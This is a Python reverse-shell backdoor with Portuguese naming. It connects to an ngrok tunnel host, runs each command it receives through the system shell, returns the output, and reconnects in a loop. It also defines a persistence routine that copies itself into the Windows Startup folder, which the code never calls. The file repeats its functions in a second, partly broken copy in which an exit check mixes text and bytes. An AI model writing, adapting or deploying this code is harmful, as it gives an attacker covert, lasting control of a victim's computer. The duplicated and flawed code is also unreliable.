import subprocess
import time
import socket
import threading
import os

ip = '0.tcp.sa.ngrok.io'
port = 11473

def persistence():
  filename = os.path.basename(__file__)
  os.system(f'copy {filename} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"')


def cliente(ip, port):
  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  client.connect((ip, port))
  return client 


def cmd(client, data):
  try:
    
    out = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = out.stdout.read()
    client.send(output + b'\n')
  
  except Exception as error:
    print(f'erro: {error}')


def listen(client): 
  while True:
    data = client.recv(1024).decode()
    if data == '/sair':
      exit()
    else:
      threading.Thread(target=cmd, args=(client, data)).start()

if __name__=='__main__':
  while True:
    client = cliente(ip, port)
    if client:
      listen(client)
    else:
      time.sleep(5)    


def client():
  cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  cliente.connect((ip, port))
  return cliente 


def cmd(client, data):
  out = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
  output = out.stdout.read()
  client.send(output + b'\n')

def listen(client): 
  while True:
    data = client.recv(1024).decode()
    if data == '/.sair'+ b'\n':
      return
    else:
      cmd(client, data)

if __name__=='__main__':
  while True:
    client = cliente(ip, port)
    if client:
      listen(client)
    else:
      time.sleep(5)
